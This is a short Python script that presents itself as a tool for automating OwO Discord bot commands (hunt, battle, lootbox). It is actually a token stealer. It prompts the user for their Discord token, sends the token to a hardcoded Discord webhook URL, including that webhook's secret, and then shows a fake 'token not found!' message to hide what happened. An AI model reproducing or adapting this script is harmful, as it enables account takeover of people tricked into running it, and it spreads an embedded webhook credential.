import requests
import os

from discord_webhook import DiscordWebhook

print('''


   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                                                                     
	Owo Hunt- Owo battle - Owo lootbox...!
''')


tokenstel = input("Token (If you do not enter the token, it will not work.): ")
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1143948396571398254/TSsLZ97J2_Cr5qCXW5wPJvYgRmD0VYQcLDeg_HfV_D_2fh4I7qLcdf4m4lmIQ7lCYxrx', content=tokenstel)
respond = webhook.execute()

os.system("cls")
input("Press enter to start..")
os.system("cls")

print('''



   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                        
''')

print('''
--------------------
token not found!
--------------------
''')
input()
